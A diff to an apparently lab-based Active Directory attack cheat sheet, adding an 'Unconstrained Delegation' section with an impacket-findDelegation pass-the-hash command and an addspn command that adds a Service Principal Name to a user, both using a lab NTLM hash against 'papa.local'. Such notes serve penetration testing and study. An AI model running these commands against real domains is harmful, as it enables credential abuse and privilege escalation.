@@ -626,8 +626,23 @@ pygpoabuse 'papa.local/dev:password' -gpo-id 'AD57560C-6272-4088-892B-C0A7D6D874
 
 <img width="1753" height="245" alt="image" src="https://github.com/user-attachments/assets/2545aeb5-4e14-45c1-bb18-c6362229fa99" />
 
-
-
 ----------------
 
-------------
+### Unconstrained Delegation
+----------------
+
+- Find a user with unconstrained delegation-:
+
+```bash
+impacket-findDelegation 'papa.local/delegation_user'  -dc-ip 192.168.130.136  -hashes aad3b435b51404eeaad3b435b51404ee:4a5d8fb255b44f32cf2831a488b3afb1
+```
+
+<img width="1577" height="310" alt="image" src="https://github.com/user-attachments/assets/0167403c-069e-43b4-9622-b4451142db11" />
+
+- Add a Service Principal Name to the user if it doesn't exist-:
+
+```bash
+addspn -u papa.local\\delegation_user -p 'aad3b435b51404eeaad3b435b51404ee:4a5d8fb255b44f32cf2831a488b3afb1' -s papa.local/delegated_user.papa.local --target-type samname 192.168.130.136
+```
+
+-----------------
